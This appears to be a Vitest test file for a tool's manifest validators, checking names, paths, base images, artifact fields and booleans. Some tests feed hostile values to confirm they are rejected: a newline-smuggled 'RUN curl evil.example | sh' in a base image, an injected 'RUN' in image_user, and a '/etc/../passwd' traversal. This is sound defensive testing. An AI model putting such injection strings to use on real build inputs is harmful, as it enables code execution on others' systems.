import { describe, it, expect } from 'vitest';
import {
    Manifest_Validation_Error,
    NAME_REGEX,
    SINGLE_PATH_COMPONENT_DISALLOWED,
    POSIX_RESERVED_CHAR_REGEX,
    WINDOWS_DRIVE_LETTER_REGEX,
    compare_by_code_unit_order,
    fail,
    reject_null_bytes,
    validate_absolute_linux_path,
    validate_artifact_name,
    validate_artifact_type,
    validate_base_family,
    validate_base_image,
    validate_name,
    validate_package_manager,
    validate_simple_path_component,
    validate_strict_boolean,
    validate_string_non_empty,
} from '../../../../src/tools/configured_provider/validators.js';

describe('compare_by_code_unit_order', () => {
    it('returns -1 when a sorts before b', () => {
        expect(compare_by_code_unit_order('a', 'b')).toBe(-1);
    });

    it('returns 1 when a sorts after b', () => {
        expect(compare_by_code_unit_order('b', 'a')).toBe(1);
    });

    it('returns 0 on equality', () => {
        expect(compare_by_code_unit_order('foo', 'foo')).toBe(0);
    });

    it('orders multi-byte characters by UTF-16 code unit (matches default Array.sort)', () => {
        const inputs = ['é', 'a', 'Z', '1'];
        const sorted_by_helper = [...inputs].sort(compare_by_code_unit_order);
        const sorted_by_default = [...inputs].sort();
        expect(sorted_by_helper).toEqual(sorted_by_default);
    });
});

describe('fail / Manifest_Validation_Error', () => {
    it('throws Manifest_Validation_Error with the given reason as message and the field path as a field', () => {
        let caught: Manifest_Validation_Error | null = null;
        try {
            fail('requirements.name', 'must be a string');
        } catch (error) {
            caught = error as Manifest_Validation_Error;
        }
        expect(caught).toBeInstanceOf(Manifest_Validation_Error);
        expect(caught?.message).toBe('must be a string');
        expect(caught?.field_path).toBe('requirements.name');
        expect(caught?.name).toBe('Manifest_Validation_Error');
    });
});

describe('regex constants', () => {
    it('NAME_REGEX accepts lowercase letters, digits, hyphens only', () => {
        expect(NAME_REGEX.test('aider')).toBe(true);
        expect(NAME_REGEX.test('custom-tool')).toBe(true);
        expect(NAME_REGEX.test('gemini-cli-2')).toBe(true);
        expect(NAME_REGEX.test('UPPER')).toBe(false);
        expect(NAME_REGEX.test('has_underscore')).toBe(false);
        expect(NAME_REGEX.test('')).toBe(false);
        expect(NAME_REGEX.test('with space')).toBe(false);
    });

    it('SINGLE_PATH_COMPONENT_DISALLOWED matches / \\ or null', () => {
        expect(SINGLE_PATH_COMPONENT_DISALLOWED.test('a/b')).toBe(true);
        expect(SINGLE_PATH_COMPONENT_DISALLOWED.test('a\\b')).toBe(true);
        expect(SINGLE_PATH_COMPONENT_DISALLOWED.test('a\0b')).toBe(true);
        expect(SINGLE_PATH_COMPONENT_DISALLOWED.test('plain')).toBe(false);
    });

    it('POSIX_RESERVED_CHAR_REGEX matches ASCII control characters and NUL', () => {
        expect(POSIX_RESERVED_CHAR_REGEX.test('\0')).toBe(true);
        expect(POSIX_RESERVED_CHAR_REGEX.test('\x07')).toBe(true);
        expect(POSIX_RESERVED_CHAR_REGEX.test('\x1f')).toBe(true);
        expect(POSIX_RESERVED_CHAR_REGEX.test('normal')).toBe(false);
        // Space and printable characters are NOT control characters.
        expect(POSIX_RESERVED_CHAR_REGEX.test(' ')).toBe(false);
    });

    it('WINDOWS_DRIVE_LETTER_REGEX matches drive-letter prefixes', () => {
        expect(WINDOWS_DRIVE_LETTER_REGEX.test('C:\\path')).toBe(true);
        expect(WINDOWS_DRIVE_LETTER_REGEX.test('c:/path')).toBe(true);
        expect(WINDOWS_DRIVE_LETTER_REGEX.test('Z:\\')).toBe(true);
        expect(WINDOWS_DRIVE_LETTER_REGEX.test('/unix/path')).toBe(false);
        expect(WINDOWS_DRIVE_LETTER_REGEX.test('AB:\\path')).toBe(false);
    });
});

describe('validate_string_non_empty', () => {
    it('returns the value when it is a non-blank string', () => {
        expect(validate_string_non_empty('hello', 'field')).toBe('hello');
    });

    it('throws when the value is not a string', () => {
        expect(() => validate_string_non_empty(42, 'field')).toThrow(/must be a string/);
        expect(() => validate_string_non_empty(undefined, 'field')).toThrow(/must be a string/);
        expect(() => validate_string_non_empty(null, 'field')).toThrow(/must be a string/);
    });

    it('throws when the value is empty or only whitespace', () => {
        expect(() => validate_string_non_empty('', 'field')).toThrow(/non-whitespace/);
        expect(() => validate_string_non_empty('   ', 'field')).toThrow(/non-whitespace/);
        expect(() => validate_string_non_empty('\t\n', 'field')).toThrow(/non-whitespace/);
    });
});

describe('validate_name', () => {
    it('accepts kebab-case names', () => {
        expect(validate_name('aider')).toBe('aider');
        expect(validate_name('custom-tool-2')).toBe('custom-tool-2');
    });

    it('rejects names that violate NAME_REGEX', () => {
        expect(() => validate_name('UPPER')).toThrow();
        expect(() => validate_name('has_underscore')).toThrow();
        expect(() => validate_name('')).toThrow();
        expect(() => validate_name(123)).toThrow();
    });

    it('uses the provided field name in the error', () => {
        expect(() => validate_name(123, 'overrides_builtin.name')).toThrow(/overrides_builtin\.name|must match/);
    });
});

describe('validate_simple_path_component', () => {
    it('accepts a single non-navigating filename', () => {
        expect(validate_simple_path_component('config', 'f')).toBe('config');
        expect(validate_simple_path_component('with.dots', 'f')).toBe('with.dots');
    });

    it('rejects empty / navigation tokens', () => {
        expect(() => validate_simple_path_component('', 'f')).toThrow(/not be empty/);
        expect(() => validate_simple_path_component('.', 'f')).toThrow(/navigation token/);
        expect(() => validate_simple_path_component('..', 'f')).toThrow(/navigation token/);
    });

    it('rejects path separators and absolute paths', () => {
        expect(() => validate_simple_path_component('/abs', 'f')).toThrow(/start with \//);
        expect(() => validate_simple_path_component('a/b', 'f')).toThrow(/path separators/);
        expect(() => validate_simple_path_component('a\\b', 'f')).toThrow(/path separators/);
    });

    it('rejects ".." embedded inside the name', () => {
        expect(() => validate_simple_path_component('foo..bar', 'f')).toThrow(/\.\./);
    });

    it('rejects newlines / ASCII control characters (image_user Dockerfile injection)', () => {
        // image_user is rendered as `USER ${value}`; a newline would inject a
        // further Dockerfile directive.
        expect(() => validate_simple_path_component('root\nRUN evil', 'image_user'))
            .toThrow(/newlines or ASCII control characters/);
        expect(() => validate_simple_path_component('a\x07b', 'f'))
            .toThrow(/newlines or ASCII control characters/);
    });

    it('rejects non-string inputs', () => {
        expect(() => validate_simple_path_component(null, 'f')).toThrow(/must be a string/);
    });
});

describe('validate_base_image', () => {
    it('accepts ordinary image references (registry, tag, digest)', () => {
        expect(validate_base_image('node:22')).toBe('node:22');
        expect(validate_base_image('registry.example.com:5000/team/app@sha256:abc'))
            .toBe('registry.example.com:5000/team/app@sha256:abc');
    });

    it('rejects empty / non-string values', () => {
        expect(() => validate_base_image('')).toThrow(/non-whitespace/);
        expect(() => validate_base_image(42)).toThrow(/must be a string/);
    });

    it('rejects newlines (FROM line Dockerfile injection)', () => {
        // `FROM ${base_image}` — a newline would end the FROM and inject a RUN.
        expect(() => validate_base_image('node:22\nRUN curl evil.example | sh'))
            .toThrow(/newlines or ASCII control characters/);
    });

    it('rejects other ASCII control characters', () => {
        expect(() => validate_base_image('node:22\x07')).toThrow(/newlines or ASCII control characters/);
    });
});

describe('validate_absolute_linux_path', () => {
    it('accepts absolute POSIX paths', () => {
        expect(validate_absolute_linux_path('/etc/hostname', 'f')).toBe('/etc/hostname');
        expect(validate_absolute_linux_path('/home/patchlab/.config', 'f')).toBe('/home/patchlab/.config');
    });

    it('rejects relative paths', () => {
        expect(() => validate_absolute_linux_path('etc/hostname', 'f')).toThrow(/absolute/);
        expect(() => validate_absolute_linux_path('', 'f')).toThrow(/absolute/);
    });

    it('rejects control characters and null bytes', () => {
        expect(() => validate_absolute_linux_path('/path\0/with/null', 'f')).toThrow(/null bytes/);
        expect(() => validate_absolute_linux_path('/path/\x07/bell', 'f')).toThrow(/null bytes/);
    });

    it('rejects paths containing ..', () => {
        expect(() => validate_absolute_linux_path('/etc/../passwd', 'f')).toThrow(/\.\./);
    });

    it('rejects non-string inputs', () => {
        expect(() => validate_absolute_linux_path(42, 'f')).toThrow(/must be a string/);
    });
});

describe('validate_artifact_name', () => {
    it('accepts plain non-empty names', () => {
        expect(validate_artifact_name('chat-log', 'f')).toBe('chat-log');
    });

    it('rejects whitespace boundary issues', () => {
        expect(() => validate_artifact_name('', 'f')).toThrow();
        expect(() => validate_artifact_name(' leading', 'f')).toThrow();
        expect(() => validate_artifact_name('trailing ', 'f')).toThrow();
    });

    it('rejects control characters', () => {
        expect(() => validate_artifact_name('name\x07', 'f')).toThrow(/control characters/);
    });

    it('rejects non-string inputs', () => {
        expect(() => validate_artifact_name(null, 'f')).toThrow(/must be a string/);
    });
});

describe('validate_artifact_type', () => {
    it('accepts the two literal values', () => {
        expect(validate_artifact_type('file', 'f')).toBe('file');
        expect(validate_artifact_type('directory', 'f')).toBe('directory');
    });

    it('rejects everything else', () => {
        expect(() => validate_artifact_type('symbolic_link', 'f')).toThrow();
        expect(() => validate_artifact_type('', 'f')).toThrow();
        expect(() => validate_artifact_type(undefined, 'f')).toThrow();
    });
});

describe('validate_base_family', () => {
    it('returns debian when undefined', () => {
        expect(validate_base_family(undefined)).toBe('debian');
    });

    it('accepts the three allowed values', () => {
        expect(validate_base_family('debian')).toBe('debian');
        expect(validate_base_family('alpine')).toBe('alpine');
        expect(validate_base_family('prebuilt')).toBe('prebuilt');
    });

    it('rejects coerced-truthy values', () => {
        expect(() => validate_base_family(1)).toThrow();
        expect(() => validate_base_family(true)).toThrow();
        expect(() => validate_base_family('Debian')).toThrow();
    });
});

describe('validate_package_manager', () => {
    it('defaults to apt for debian when undefined', () => {
        expect(validate_package_manager(undefined, 'debian')).toBe('apt');
    });

    it('defaults to apk for alpine when undefined', () => {
        expect(validate_package_manager(undefined, 'alpine')).toBe('apk');
    });

    it('defaults to undefined for prebuilt when undefined', () => {
        expect(validate_package_manager(undefined, 'prebuilt')).toBeUndefined();
    });

    it('accepts apt and apk when explicit', () => {
        expect(validate_package_manager('apt', 'debian')).toBe('apt');
        expect(validate_package_manager('apk', 'alpine')).toBe('apk');
    });

    it('rejects dnf and unknown', () => {
        expect(() => validate_package_manager('dnf', 'debian')).toThrow(/deferred/);
        expect(() => validate_package_manager('unknown', 'debian')).toThrow(/deferred/);
    });

    it('rejects capitalized variants', () => {
        expect(() => validate_package_manager('APT', 'debian')).toThrow();
    });
});

describe('validate_strict_boolean', () => {
    it('accepts true and false', () => {
        expect(validate_strict_boolean(true, 'f')).toBe(true);
        expect(validate_strict_boolean(false, 'f')).toBe(false);
    });

    it('rejects coerced-truthy values (no implicit casting)', () => {
        expect(() => validate_strict_boolean('true', 'f')).toThrow(/YAML boolean/);
        expect(() => validate_strict_boolean(1, 'f')).toThrow();
        expect(() => validate_strict_boolean(0, 'f')).toThrow();
        expect(() => validate_strict_boolean(null, 'f')).toThrow();
        expect(() => validate_strict_boolean(undefined, 'f')).toThrow();
    });
});

describe('reject_null_bytes', () => {
    it('returns undefined silently when no null byte is present', () => {
        expect(reject_null_bytes('plain', 'f')).toBeUndefined();
    });

    it('throws when the string contains a null byte', () => {
        expect(() => reject_null_bytes('with\0null', 'f')).toThrow(/null bytes/);
    });
});
